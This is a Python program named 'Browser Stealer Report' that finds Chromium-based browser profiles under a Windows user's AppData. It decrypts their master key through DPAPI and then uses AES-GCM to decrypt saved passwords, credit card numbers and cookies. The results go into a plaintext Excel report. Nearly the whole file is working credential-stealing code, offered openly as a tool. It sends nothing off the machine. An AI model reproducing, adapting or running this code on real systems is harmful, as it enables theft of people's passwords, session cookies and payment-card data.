############################################################################
#
#   Browser_Stealer_Report.py [ Main Program ]
#   © 2022 ABDULKADİR GÜNGÖR All Rights Reserved
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	04/2022
#	All Rights Reserved (Tüm Hakları Saklıdır)
#
############################################################################
import os, sqlite3, random, string, shutil, xlwt
from Crypto.Cipher import AES
from datetime import datetime
#
#
# DataBrowser
class DataBrowser:
    #
    login_data ="Login Data"
    web_data   ="Web Data"
    cookies    ="Cookies"
    #
    def __init__(self):
        self.local_state_path = None
        self.check_files = [DataBrowser.login_data, DataBrowser.web_data, DataBrowser.cookies]
        self.files = list()


# Data_login
class Data_login:
    def __init__(self, url, username, password_encrpyt):
        self.url = url
        self.username = username
        self.password_encrpyt = password_encrpyt
        self.password_decrpyt = None
    #
    def check(self):
        if self.password_decrpyt is not None:
            if self.password_decrpyt != b'' and self.password_decrpyt != b' ':
                return True
        return False

# Data_card
class Data_card:
    def __init__(self, username, expire_mon, expire_year, number_encrpyt):
        self.username = username
        self.expire_mon = expire_mon
        self.expire_year = expire_year
        self.number_encrpyt = number_encrpyt
        self.number_decrpyt = None
    #
    def check(self):
        if self.number_decrpyt is not None:
            if self.number_decrpyt != b'' and self.number_decrpyt != b' ':
                return True
        return False

# Data_cookie
class Data_cookie:
    def __init__(self, creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, last_access_utc, has_expires):
        self.creation_utc = creation_utc
        self.host_key = host_key
        self.top_frame_site_key = top_frame_site_key
        self.name = name
        self.value = value
        self.encrypted_value = encrypted_value
        self.decrypted_value = None
        self.path = path
        self.expires_utc = expires_utc
        self.last_access_utc = last_access_utc
        if int(has_expires) == 0:
            self.has_expires = False
        else:
            self.has_expires = True
    #
    def check(self):
        if self.decrypted_value is not None:
            if self.decrypted_value != b'' and self.decrypted_value != b' ':
                return True
        return False

# Create Random Directory
class RandomTmp:
    def __init__(self):
        rr = random.sample(string.digits + string.ascii_uppercase, k=36)
        drc0 = rr[0] + rr[1] + rr[2] + rr[3] + rr[4] + rr[5] + rr[6] + rr[7] + "-" + rr[8] + rr[9] + rr[10] + rr[
            11] + "-" + rr[12] + rr[13] + rr[14] + rr[15] + "-" + rr[16] + rr[17] + rr[18] + rr[19] + "-" + rr[20] + rr[
                   21] + rr[22] + rr[23] + rr[24] + rr[25] + rr[26] + rr[27] + rr[28] + rr[29] + rr[30] + rr[31]
        self.tmp_path = os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + drc0
        os.mkdir(self.tmp_path)
        self.old_dir = None
    #
    def __new_file_path(self):
        rr = random.sample(string.digits + string.ascii_lowercase, k=11)
        drc1 = rr[0] + rr[1] + rr[2] + rr[3] + rr[4] + rr[5] + rr[6] + rr[7] + "." + rr[8] + rr[9] + rr[10]
        rr = random.sample(string.digits + string.ascii_lowercase, k=36)
        file = rr[0] + rr[1] + rr[2] + rr[3] + rr[4] + rr[5] + rr[6] + rr[7] + "-" + rr[8] + rr[9] + rr[10] + rr[
            11] + "-" + rr[12] + rr[13] + rr[14] + rr[15] + "-" + rr[16] + rr[17] + rr[18] + rr[19] + "-" + rr[20] + rr[
                    21] + rr[22] + rr[23] + rr[24] + rr[25] + rr[26] + rr[27] + rr[28] + rr[29] + rr[30] + rr[
                    31] + ".tmp"
        #
        os.mkdir(self.tmp_path +"\\"+drc1)
        return self.tmp_path + "\\" + drc1 , self.tmp_path + "\\" + drc1 + "\\" + file
    #
    def copy_file(self, file):
        if self.old_dir is not None:
            shutil.rmtree(self.old_dir, ignore_errors=False, onerror=None)
        self.old_dir, tmp = self.__new_file_path()
        shutil.copy2(file,tmp)
        return tmp
    #
    def close(self):
        if self.old_dir is not None:
            shutil.rmtree(self.old_dir, ignore_errors=False, onerror=None)
        shutil.rmtree(self.tmp_path, ignore_errors=False, onerror=None)


# Result, directory, files = dir(path)
def dir(path):
    files = list()
    directory = list()
    try:
        for tmp in os.scandir(path):
            if tmp.is_file():
                files.append(tmp.name)
            elif tmp.is_dir():
                directory.append(tmp.name)
        return True ,directory, files
    except:
        return  False ,directory , files

# browser = browser_files_find(browser, search_path)
def browser_files_find(browser:DataBrowser,search_path):
    rr,dd,ff = dir(search_path)
    if rr:
        for fname in  ff:
            for check_f in  browser.check_files:
                if fname == check_f:
                    browser.files.append( search_path + "\\" + fname )
        #
        for dname in  dd:
            cdname = search_path + "\\" + dname
            browser = browser_files_find(browser, cdname)
    #
    return browser

# (list) [browser0, browser1, ... ] = browser_find(search_path)
def browser_find(search_path):
    res = list()
    #
    rr,dd,ff = dir(search_path)
    if rr:
        for fname in  ff:
            if fname == "Local State":
                browser = DataBrowser()
                browser.local_state_path = search_path+ "\\" + fname
                return [browser_files_find(browser, search_path)]
        for dname in dd:
            cdname = search_path + "\\" + dname
            tmp = browser_find(cdname)
            res += tmp
    #
    return res

# (dict) json_data = json_file(file)
def json_file(file):
    import json
    # ***
    try:
        with open(file, "r", encoding="UTF-8") as rfile:
            data = rfile.read()
            return json.loads(data)
    except:
        return None

# string or None = masterkey_encrypt(file)
def masterkey_encrypt(file):
    import base64
    # ***
    try:
        return base64.b64decode(json_file(file)["os_crypt"]["encrypted_key"])
    except:
        return None

# string or None = masterkey(file)
def masterkey(file):
    import win32crypt
    # ***
    try:
        return win32crypt.CryptUnprotectData(masterkey_encrypt(file)[5:])[1]
    except:
        return None

# bytes or None = decrypt(master_key, encrypt_password)
def decrypt(master_key, encrypt_password):
    try:
        # redundant_portion_0 = encrypt_password[0:3]
        nonce_portion = encrypt_password[3:15]
        ciphertext_portion = encrypt_password[15:]
        #
        aes = AES.new(master_key, AES.MODE_GCM, nonce_portion)
        passwd = aes.decrypt(ciphertext_portion)[:-16]
        # redundant_portion_1 = aes.decrypt(ciphertext_portion)[-16:]
        return None if passwd == b'' else passwd
    except:
        return None

# string or None = convert_date(i_time:int)
def convert_date(i_time):
    if int(i_time) == 0:
        utc = datetime.utcfromtimestamp(0)
    else:
        fname = 116444736000000000
        nseconds = 10000000
        #
        utc = datetime.utcfromtimestamp(((10 * int(i_time)) - fname) / nseconds)
        #
    return utc.strftime('%Y-%m-%d %H:%M:%S')

# (list) [Data_login0, Data_login1, ... ]= get_logins_data(masterkey, file_path)
def get_logins_data(masterkey, file_path):
    list_logins = []
    #
    try:
        db = sqlite3.connect(file_path, uri=True)
        cursor = db.cursor()
        cursor.execute("Select origin_url, username_value, password_value from logins")
        res = cursor.fetchall()
        cursor.close()
        db.close()
        #
        for url, name, password in res:
            tmp = Data_login(url, name, password)
            decrypt_data = decrypt(masterkey, tmp.password_encrpyt)
            if decrypt_data is not None:
                tmp.password_decrpyt = decrypt_data
            list_logins.append(tmp)
    except:
        return  list_logins
    return list_logins

# (list) [Data_card0, Data_card1, ... ] = get_cards_data(masterkey, file_path)
def get_cards_data(masterkey, file_path):
    list_cards = []
    #
    try:
        db = sqlite3.connect(file_path, uri=True)
        cursor = db.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year,card_number_encrypted FROM credit_cards")
        res = cursor.fetchall()
        cursor.close()
        db.close()
        #
        for name, month, year, number in res:
            tmp = Data_card(name, month, year, number)
            decrypt_data = decrypt(masterkey, tmp.number_encrpyt)
            if decrypt is not None:
                tmp.number_decrpyt = decrypt_data
            list_cards.append(tmp)
    except:
        return list_cards
    return list_cards

# (list) [Data_cookie0, Data_cookie1, ... ]= get_cookies_data(masterkey, file_path)
def get_cookies_data(masterkey, file_path):
    list_cookies=[]
    #
    try:
        db = sqlite3.connect(file_path, uri=True)
        cursor = db.cursor()
        cursor.execute(
            "SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, last_access_utc, has_expires FROM cookies")
        res = cursor.fetchall()
        cursor.close()
        db.close()
        #
        for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, last_access_utc, has_expires in res:
            tmp = Data_cookie(convert_date(creation_utc), host_key, top_frame_site_key, name, value, encrypted_value, path, convert_date(expires_utc), convert_date(last_access_utc), has_expires)
            decrypt_data = decrypt(masterkey, tmp.encrypted_value)
            if decrypt_data is not None:
                tmp.decrypted_value = decrypt_data
            list_cookies.append(tmp)
    except:
        return  list_cookies
    return list_cookies

# (list) [browser0, browser1, ... ] = get_browsers()
def get_browsers():
    appdata = os.environ['USERPROFILE'] + "\\AppData"
    return browser_find(appdata)

# (list) [path0, path1, ... ] = get_search_paths(browser:DataBrowser, file:str):
def get_search_paths(browser:DataBrowser, file:str):
    files = []
    for fname in browser.files:
        try:
            if fname[-(len(file)):] == file:
                files.append(fname)
        except:
            continue
    return files

# find big value
def get_big(val0, val1):
    return  val0 if val0>val1 else val1

# generate report
def report_xls( browsers, logins, cards, cookies):
    # Workbook is created
    wb = xlwt.Workbook()
    #
    if browsers is not None:
        sheet_browser = wb.add_sheet('Browsers')
        #
        browser_no = 1
        column_size = 0
        line = 0
        #
        for browser in browsers:
            style = xlwt.easyxf('font: bold 1')
            title = "Browser " + str(browser_no)
            browser_no += 1
            column_size = get_big(column_size, len(title))
            sheet_browser.write(line, 0, title, style)
            line += 1
            column_size = get_big(column_size, len(browser.local_state_path))
            sheet_browser.write(line, 0, browser.local_state_path)
            line += 1
            for file in browser.files:
                sheet_browser.write(line, 0, file)
                column_size = get_big(column_size, len(file))
                line += 1
        #
        if column_size > 0:
            sheet_browser.col(0).width = (256 * (column_size+ 1) if 256 * (column_size + 1) < 65535 else 65535)
    #
    if logins is not None:
        sheet_login = wb.add_sheet('Logins Data')
        #
        #
        column_url_size = len("Url")
        column_user_size = len("Username")
        column_password_size = len("Password")
        line = 0
        #
        style = xlwt.easyxf('font: bold 1')
        sheet_login.write(line, 0, "Url", style)
        sheet_login.write(line, 1, "Username", style)
        sheet_login.write(line, 2, "Password", style)
        for login in logins:
            if login.check():
                line += 1
                column_url_size = get_big(column_url_size, len(login.url))
                sheet_login.write(line, 0, login.url)
                #
                column_user_size = get_big(column_user_size, len(login.username))
                sheet_login.write(line, 1, login.username)
                #
                column_password_size = get_big(column_password_size, len(login.password_decrpyt))
                sheet_login.write(line, 2, login.password_decrpyt.decode('utf-8', errors="ignore") )
        #
        if column_url_size >  0:
            sheet_login.col(0).width = (256 * (column_url_size + 1) if 256 * (column_url_size + 1) < 65535 else 65535)
        if column_user_size > 0:
            sheet_login.col(1).width = (256 * (column_user_size + 1) if 256 * (column_user_size + 1) < 65535 else 65535)
        if column_password_size > 0:
            sheet_login.col(2).width = (256 * (column_password_size + 1) if 256 * (column_password_size + 1) < 65535 else 65535)
    #
    if cards is not None:
        sheet_card = wb.add_sheet('Cards Data')
        #
        column_username_size = len("Username")
        column_month_size = 5
        column_year_size = 5
        column_number_size = 16
        line = 0
        #
        style = xlwt.easyxf('font: bold 1')
        sheet_card.write(line, 0, "Username", style)
        sheet_card.write(line, 1, "Month", style)
        sheet_card.write(line, 2, "Year", style)
        sheet_card.write(line, 3, "Card Number", style)
        for card in cards:
            if card.check():
                line += 1
                column_username_size = get_big(column_username_size, len(card.username))
                sheet_card.write(line, 0, card.username)
                #
                sheet_card.write(line, 1, card.expire_mon  )
                sheet_card.write(line, 2, card.expire_year )
                sheet_card.write(line, 3, card.number_decrpyt.decode('utf-8', errors="ignore") )
        #
        if column_username_size >  0:
            sheet_card.col(0).width = (256 * (column_username_size + 1) if 256 * (column_username_size + 1) < 65535 else 65535)
        if column_month_size > 0:
            sheet_card.col(1).width = (256 * (column_month_size + 1) if 256 * (column_month_size + 1) < 65535 else 65535)
        if column_year_size > 0:
            sheet_card.col(2).width = (256 * (column_year_size + 1) if 256 * (column_year_size + 1) < 65535 else 65535)
        if column_number_size > 0:
            sheet_card.col(3).width = (256 * (column_number_size + 1) if 256 * (column_number_size + 1) < 65535 else 65535)
    #
    if cookies is not None:
        sheet_cookies = wb.add_sheet('(Current) Cookies')
        #
        column_0_size = len("Creation UTC")
        column_1_size = len("Host Key")
        column_2_size = len("Top Frame Site Key")
        column_3_size = len("Name")
        column_4_size = len("Value")
        column_5_size = len("Decrypted Value")
        column_6_size = len("Path")
        column_7_size = len("Expires UTC")
        column_8_size = len("Last Access UTC")
        line = 0
        #
        style = xlwt.easyxf('font: bold 1')
        sheet_cookies.write(line, 0, "Creation UTC", style)
        sheet_cookies.write(line, 1, "Host Key", style)
        sheet_cookies.write(line, 2, "Top Frame Site Key", style)
        sheet_cookies.write(line, 3, "Name", style)
        sheet_cookies.write(line, 4, "Value", style)
        sheet_cookies.write(line, 5, "Decrypted Value", style)
        sheet_cookies.write(line, 6, "Path", style)
        sheet_cookies.write(line, 7, "Expires UTC", style)
        sheet_cookies.write(line, 8, "Last Access UTC", style)
        #
        for cookie in cookies:
            if cookie.check():
                if not cookie.has_expires:
                    line += 1
                    #
                    column_0_size = get_big(column_0_size, len(cookie.creation_utc))
                    sheet_cookies.write(line, 0, cookie.creation_utc)
                    #
                    column_1_size = get_big(column_1_size, len(cookie.host_key))
                    sheet_cookies.write(line, 1, cookie.host_key)
                    #
                    column_2_size = get_big(column_2_size, len(cookie.top_frame_site_key))
                    sheet_cookies.write(line, 2, cookie.top_frame_site_key)
                    #
                    column_3_size = get_big(column_3_size, len(cookie.host_key))
                    sheet_cookies.write(line, 3, cookie.host_key)
                    #
                    column_4_size = get_big(column_4_size, len( str(cookie.value) ))
                    sheet_cookies.write(line, 4, str(cookie.value) )
                    #
                    column_5_size = get_big(column_5_size, len(  str(cookie.decrypted_value)  ))
                    sheet_cookies.write(line, 5, str(cookie.decrypted_value) )
                    #
                    column_6_size = get_big(column_6_size, len(cookie.path))
                    sheet_cookies.write(line, 6, cookie.path)
                    #
                    column_7_size = get_big(column_7_size, len(cookie.expires_utc))
                    sheet_cookies.write(line, 7, cookie.expires_utc)
                    #
                    column_8_size = get_big(column_8_size, len(cookie.last_access_utc))
                    sheet_cookies.write(line, 8, cookie.last_access_utc)
                    #
        if column_0_size >  0:
            sheet_cookies.col(0).width =  (256 * (column_0_size+1) if  256 * (column_0_size+1) < 65535 else 65535)
        if column_1_size >  0:
            sheet_cookies.col(1).width =  (256 * (column_1_size+1) if  256 * (column_1_size+1) < 65535 else 65535)
        if column_2_size >  0:
            sheet_cookies.col(2).width =  (256 * (column_2_size+1) if  256 * (column_2_size+1) < 65535 else 65535)
        if column_3_size >  0:
            sheet_cookies.col(3).width =  (256 * (column_3_size+1) if  256 * (column_3_size+1) < 65535 else 65535)
        if column_4_size >  0:
            sheet_cookies.col(4).width =  (256 * (column_4_size+1) if  256 * (column_4_size+1) < 65535 else 65535)
        if column_5_size >  0:
            sheet_cookies.col(5).width =  (256 * (column_5_size+1) if  256 * (column_5_size+1) < 65536 else 65535)
        if column_6_size >  0:
            sheet_cookies.col(6).width =  (256 * (column_6_size+1) if  256 * (column_6_size+1) < 65536 else 65535)
        if column_7_size >  0:
            sheet_cookies.col(7).width =  (256 * (column_7_size+1) if  256 * (column_7_size+1) < 65536 else 65535)
        if column_8_size >  0:
            sheet_cookies.col(8).width =  (256 * (column_8_size+1) if  256 * (column_8_size+1) < 65536 else 65535)
        #
        #
        if cookies is not None:
            sheet_cookies = wb.add_sheet('(Expired) Cookies')
            #
            column_0_size = len("Creation UTC")
            column_1_size = len("Host Key")
            column_2_size = len("Top Frame Site Key")
            column_3_size = len("Name")
            column_4_size = len("Value")
            column_5_size = len("Decrypted Value")
            column_6_size = len("Path")
            column_7_size = len("Expires UTC")
            column_8_size = len("Last Access UTC")
            line = 0
            #
            style = xlwt.easyxf('font: bold 1')
            sheet_cookies.write(line, 0, "Creation UTC", style)
            sheet_cookies.write(line, 1, "Host Key", style)
            sheet_cookies.write(line, 2, "Top Frame Site Key", style)
            sheet_cookies.write(line, 3, "Name", style)
            sheet_cookies.write(line, 4, "Value", style)
            sheet_cookies.write(line, 5, "Decrypted Value", style)
            sheet_cookies.write(line, 6, "Path", style)
            sheet_cookies.write(line, 7, "Expires UTC", style)
            sheet_cookies.write(line, 8, "Last Access UTC", style)
            #
            for cookie in cookies:
                if cookie.check():
                    if cookie.has_expires:
                        line += 1
                        #
                        column_0_size = get_big(column_0_size, len(cookie.creation_utc))
                        sheet_cookies.write(line, 0, cookie.creation_utc)
                        #
                        column_1_size = get_big(column_1_size, len(cookie.host_key))
                        sheet_cookies.write(line, 1, cookie.host_key)
                        #
                        column_2_size = get_big(column_2_size, len(cookie.top_frame_site_key))
                        sheet_cookies.write(line, 2, cookie.top_frame_site_key)
                        #
                        column_3_size = get_big(column_3_size, len(cookie.host_key))
                        sheet_cookies.write(line, 3, cookie.host_key)
                        #
                        column_4_size = get_big(column_4_size, len(str(cookie.value)))
                        sheet_cookies.write(line, 4, str(cookie.value))
                        #
                        column_5_size = get_big(column_5_size, len(str(cookie.decrypted_value)))
                        sheet_cookies.write(line, 5, str(cookie.decrypted_value))
                        #
                        column_6_size = get_big(column_6_size, len(cookie.path))
                        sheet_cookies.write(line, 6, cookie.path)
                        #
                        column_7_size = get_big(column_7_size, len(cookie.expires_utc))
                        sheet_cookies.write(line, 7, cookie.expires_utc)
                        #
                        column_8_size = get_big(column_8_size, len(cookie.last_access_utc))
                        sheet_cookies.write(line, 8, cookie.last_access_utc)
                        #
            if column_0_size > 0:
                sheet_cookies.col(0).width = (256 * (column_0_size + 1) if 256 * (column_0_size + 1) < 65535 else 65535)
            if column_1_size > 0:
                sheet_cookies.col(1).width = (256 * (column_1_size + 1) if 256 * (column_1_size + 1) < 65535 else 65535)
            if column_2_size > 0:
                sheet_cookies.col(2).width = (256 * (column_2_size + 1) if 256 * (column_2_size + 1) < 65535 else 65535)
            if column_3_size > 0:
                sheet_cookies.col(3).width = (256 * (column_3_size + 1) if 256 * (column_3_size + 1) < 65535 else 65535)
            if column_4_size > 0:
                sheet_cookies.col(4).width = (256 * (column_4_size + 1) if 256 * (column_4_size + 1) < 65535 else 65535)
            if column_5_size > 0:
                sheet_cookies.col(5).width = (256 * (column_5_size + 1) if 256 * (column_5_size + 1) < 65536 else 65535)
            if column_6_size > 0:
                sheet_cookies.col(6).width = (256 * (column_6_size + 1) if 256 * (column_6_size + 1) < 65536 else 65535)
            if column_7_size > 0:
                sheet_cookies.col(7).width = (256 * (column_7_size + 1) if 256 * (column_7_size + 1) < 65536 else 65535)
            if column_8_size > 0:
                sheet_cookies.col(8).width = (256 * (column_8_size + 1) if 256 * (column_8_size + 1) < 65536 else 65535)
    #
    wb.save('Report.xls')

# All process
def all_process():
    counter = 0
    logins_list = list()
    cards_list = list()
    cookie_list = list()
    randomtmp=RandomTmp()
    # generate browser
    print("\t+ Searching for browsers", end="")
    browsers = get_browsers()
    print("\t<OK!>", end="")
    #
    for browser in  browsers:
        counter += 1
        txt0 = "\n\t+ (Browser " + str(counter) + ")"
        print(txt0,"Data is being collected ...", end="")
        #
        m_key = masterkey( randomtmp.copy_file(browser.local_state_path) )
        print("\n\t\t>> Master Key \t<OK!>", end="")
        #
        for login in get_search_paths(browser, DataBrowser.login_data):
            for tmp in  get_logins_data(m_key, randomtmp.copy_file(login)):
                logins_list.append(tmp)
        print("\n\t\t>>", DataBrowser.login_data,"\t<OK!>", end="")
        #
        for card in get_search_paths(browser, DataBrowser.web_data):
            for tmp in get_cards_data(m_key, randomtmp.copy_file(card)):
                cards_list.append(tmp)
        print("\n\t\t>>", DataBrowser.web_data, "\t<OK!>", end="")
        #
        for cookie in get_search_paths(browser, DataBrowser.cookies):
            for tmp in  get_cookies_data(m_key, randomtmp.copy_file(cookie)):
                cookie_list.append(tmp)
        print("\n\t\t>>", DataBrowser.cookies, "\t<OK!>", end="")
    #
    randomtmp.close()
    print("\n\t+ Generating the report", end="")
    report_xls(browsers, logins_list, cards_list, cookie_list)
    print("\t<OK!>", end="")

# screen
def screen():
    if os.name=='nt':
        os.system('cls')
    elif os.name=='posix':
        os.system('clear')
    print(' ')
    print(' <!------------------------------------------------------ ')
    print('   | <info>                                           |')
    print('   |                                                  |')
    print('   | <Program> Browser Stealer Report V1.3 </Program> |')
    print('   |            <Date> 04/2022 </Date>                |')
    print('   |                                                  |')
    print('   |   <Developer> Abdulkadir GÜNGÖR </Developer>     |')
    print('   | <Email> abdulkadir_gungor@outlook.com </Email>   |')
    print('   |                                                  |')
    print('   |                                          </info> |')
    print(' ------------------------------------------------------!> ')
    print(' ')

# main
if __name__ == '__main__':
    screen()
    try:
        all_process()
    except Exception as error:
        print()
        print("\tAn error occurred while processing!")
        print("\n",error)
    print()
    print()
    input(" Press enter to exit the program")
